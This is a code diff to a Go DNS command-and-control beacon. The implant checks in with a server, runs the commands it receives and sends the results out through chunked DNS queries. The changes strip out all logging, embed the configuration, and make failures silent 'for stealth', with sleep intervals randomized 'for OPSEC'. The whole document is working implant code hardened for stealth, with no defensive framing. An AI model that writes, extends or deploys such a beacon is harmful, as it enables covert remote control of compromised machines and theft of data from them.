@@ -24,9 +24,9 @@ type Beacon struct {
 	running  bool
 }
 
-// NewBeacon creates a new DNS beacon
-func NewBeacon(config *Config) (*Beacon, error) {
-	client := NewDNSClient(config)
+// newBeacon creates a new DNS beacon with embedded configuration
+func newBeacon() (*Beacon, error) {
+	client := newDNSClient()
 
 	// Generate unique beacon ID
 	hostname, _ := os.Hostname()
@@ -107,22 +107,13 @@ func (b *Beacon) executeCommand(command string) string {
 
 // exfiltrateResult sends command results back via DNS using two-phase protocol
 func (b *Beacon) exfiltrateResult(result string, taskID string) error {
-	// Calculate chunk parameters.
-	// DNS has strict limits: 255 char per label, ~253 total domain name
-	// We split at 62 chars per label, so ~180 chars total for 3 labels
-	// Each result byte becomes 2 hex chars, plus overhead for headers
 	maxCmd := b.client.config.MaxCommandLength
 	if maxCmd <= 64 {
 		maxCmd = 800 // sensible default for chunked results
 	}
 
-	// Conservative estimate: "DATA|xxxx|Txxxx|999|" = ~20 chars
-	// Plus timestamp "|1234567890" = ~11 chars
-	// Total overhead ~31 chars before hex encoding = ~62 hex chars
-	// Leave extra margin for safety
+	// Conservative estimate for overhead
 	overhead := 100
-
-	// safeRawChunk: raw bytes that will fit in DNS after hex encoding + overhead
 	safeRawChunk := (maxCmd - overhead) / 2
 	if safeRawChunk < 8 {
 		safeRawChunk = 8 // minimum viable chunk
@@ -133,7 +124,6 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	if len(result) <= safeRawChunk {
 		// Send in single RESULT message
-		fmt.Printf("[*] Sending result in single message (%d bytes)\n", len(result))
 		exfilData := fmt.Sprintf("RESULT|%s|%s|%s", b.id, taskID, result)
 		_, err := b.client.sendCommand(exfilData)
 		return err
@@ -141,8 +131,6 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	// Phase 1: Send metadata about the incoming chunked result
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
-	fmt.Printf("[*] Sending result in %d chunks (chunk size: %d bytes, total: %d bytes)\n",
-		totalChunks, safeRawChunk, len(result))
 
 	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)
 	_, err := b.client.sendCommand(metaData)
@@ -172,7 +160,6 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		time.Sleep(time.Duration(rand.Intn(2)+1) * time.Second)
 	}
 
-	fmt.Printf("[+] All %d chunks sent successfully (%d bytes total)\n", totalChunks, len(result))
 	return nil
 }
 
@@ -192,20 +179,11 @@ func (b *Beacon) parseTask(response string) (taskID, command string, isTask bool
 func (b *Beacon) runBeacon() {
 	b.running = true
 
-	fmt.Printf("[*] DNS Beacon started\n")
-	fmt.Printf("[*] Beacon ID: %s\n", b.id)
-	fmt.Printf("[*] Target: %s\n", b.client.config.ServerDomain)
-	fmt.Printf("[*] Hostname: %s\n", b.hostname)
-	fmt.Printf("[*] User: %s\n", b.username)
-	fmt.Printf("[*] OS: %s/%s\n", b.os, b.arch)
-
 	// Initial check-in
-	fmt.Printf("[*] Sending initial check-in...\n")
 	_, err := b.checkIn()
 	if err != nil {
-		fmt.Printf("[!] Initial check-in failed: %v\n", err)
-	} else {
-		fmt.Printf("[+] Check-in successful\n")
+		// Silent failure for stealth
+		return
 	}
 
 	// Main beacon loop with randomized sleep intervals
@@ -219,35 +197,25 @@ func (b *Beacon) runBeacon() {
 		sleepMax = sleepMin + 10 // Default maximum
 	}
 
-	fmt.Printf("[*] Check-in interval: %d-%d seconds (randomized)\n", sleepMin, sleepMax)
-
 	for b.running {
 		// Randomize sleep interval between min and max for OPSEC
 		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
 		time.Sleep(sleepDuration)
+
 		// Send check-in
 		response, err := b.checkIn()
 		if err != nil {
-			fmt.Printf("[!] Check-in failed: %v\n", err)
-			continue
+			continue // Silent failure for stealth
 		}
 
 		// Check if server has a task for us
 		taskID, command, isTask := b.parseTask(response)
 		if isTask {
-			fmt.Printf("[*] Received task %s: %s\n", taskID, command)
-
 			// Execute the command
 			result := b.executeCommand(command)
-			fmt.Printf("[*] Command executed, result length: %d bytes\n", len(result))
 
 			// Exfiltrate the result
-			err := b.exfiltrateResult(result, taskID)
-			if err != nil {
-				fmt.Printf("[!] Failed to exfiltrate result: %v\n", err)
-			} else {
-				fmt.Printf("[+] Result exfiltrated successfully\n")
-			}
+			_ = b.exfiltrateResult(result, taskID)
 		}
 	}
 }
@@ -257,20 +225,10 @@ func main() {
 	// Seed random number generator for randomized sleep intervals
 	rand.Seed(time.Now().UnixNano())
 
-	fmt.Println("DNS C2 Beacon - Starting...")
-
-	// Load configuration
-	config, err := LoadConfig()
+	// Create beacon with embedded configuration
+	beacon, err := newBeacon()
 	if err != nil {
-		fmt.Printf("[!] Error loading config: %v\n", err)
-		return
-	}
-
-	// Create beacon
-	beacon, err := NewBeacon(config)
-	if err != nil {
-		fmt.Printf("[!] Error creating beacon: %v\n", err)
-		return
+		os.Exit(1) // Silent exit for stealth
 	}
 
 	// Handle Ctrl+C gracefully
@@ -278,7 +236,6 @@ func main() {
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
 		<-c
-		fmt.Println("\n[*] Shutting down DNS beacon...")
 		beacon.running = false
 		time.Sleep(1 * time.Second)
 		os.Exit(0)
